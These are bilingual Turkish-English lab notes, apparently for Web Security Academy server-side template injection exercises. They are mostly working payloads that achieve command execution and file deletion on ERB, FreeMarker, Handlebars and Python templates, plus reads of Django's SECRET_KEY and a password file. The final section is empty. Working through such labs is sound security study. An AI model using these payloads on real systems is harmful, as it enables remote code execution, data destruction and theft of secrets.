              Server-side template injection
              Sunucu tarafı şablon enjeksiyonu

####################################################
#      Basic server-side template injection        #
#      Temel sunucu tarafı şablon enjeksiyonu      #
####################################################

1--> Açığın tespiti için payload deniyoruz => <%= 7*7 %> 
https://$YOURLABSID.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock 
https://$YOURLABSID.web-security-academy.net/?message=%3C%=%207*7%20%%3E => payload inject ediyoruz ve sonuç dönmesini izliyoruz
https://$YOURLABSID.web-security-academy.net/?message=%3C%25%3d+7*7+%25%3E => başka bir matematiksel payload
https://$YOURLABSID.web-security-academy.net/?message=%3C%=%20system(%22whoami%22)%20%%3E => kullanıcıyı öğrendik
https://$YOURLABSID.web-security-academy.net/?message=%3C%=%20system(%22rm%20/home/carlos/morale.txt%22)%20%%3E => kullanıcının içerisindeki txt dosyasını sildik. (Hacktricks ssti ERB (Ruby) kaynakları)

###################################################################
#      Basic server-side template injection (code context)        #
#      Temel sunucu tarafı şablon enjeksiyonu (kod bağlamı)       #
###################################################################

2--> tespit için kullandığımız payload => {{7*7}}
blog-post-author-display=user.name}}{{7*7}} => payload yükledik
Peter Wiener49}} olarak yorumdaki kullanıcı adını güncelledi ve ssti var
aşağıdaki kodları inject ettik burpsuite ile
{% import os %}
{{os.system('rm /home/carlos/morale.txt')
blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt') => txt dosyası silindi.

###################################################################
#      Server-side template injection using documentation         #
#      Belgeleri kullanarak sunucu tarafı şablon enjeksiyonu      #
###################################################################

3--> 
${product.stock} left of ${product.name} at ${product.price}. olarak editliyoruz ürün edit template kısmından.
332 left of Giant Pillow Thing at $86.58. çıktı sonuç.
${product.qwe} left of ${product.name} at ${product.price}. olarak güncelledik tekrar gönderdik templateyi verdi.(FreeMarker template error )
ssti freemarker diye aratırsak hacktricks üzerinden payloadları bulabiliriz.
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")} olarak güncelledik ve idyi verdi. => uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} => ile istenilen dosyayı siliyoruz.

################################################################################################
#      Server-side template injection in an unknown language with a documented exploit         #
#      Belgelenmiş bir istismarla bilinmeyen bir dilde sunucu tarafı şablon ekleme             #
################################################################################################

4--> 
GET /?message=Unfortu${{7*7}} HTTP/2 => 500 error mesajında handlebars template kullandığını gösterdi.
hacktricks ssti handlebar diye aratınca handlebars template injection kodlarına ulaşabiliyoruz.
"""
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
"""
whoami kısmını rm /home/carlos/morale.txt yapıp urlencodeden geçiriyoruz ve siliyoruz.
GET /?message=Unfortu%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d HTTP/2

#########################################################################################################################
#      Server-side template injection with information disclosure via user-supplied objects                             #
#      Kullanıcı tarafından sağlanan nesneler aracılığıyla bilgilerin açıklandığı sunucu tarafı şablon enjeksiyonu      #
#########################################################################################################################

5--> 
{{7*7}} denedik django template çıktı ssti django template aratıyoruz ve parametre={% debug %} çıkıyor.
{{settings.SECRET_KEY}} ile sonuca ulaşıyoruz.

########################################################################
#      Server-side template injection in a sandboxed environment       #
#      Korumalı alan ortamında sunucu tarafı şablon ekleme             #
########################################################################

6-->
${product.qwe} left of ${product.name} at ${product.price}.</p> => freemarker java çıktı
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")} => ascii to text yaptık

###################################################################
#      Server-side template injection with a custom exploit       #
#      Özel bir istismarla sunucu tarafı şablon enjeksiyonu       #
###################################################################

7-->
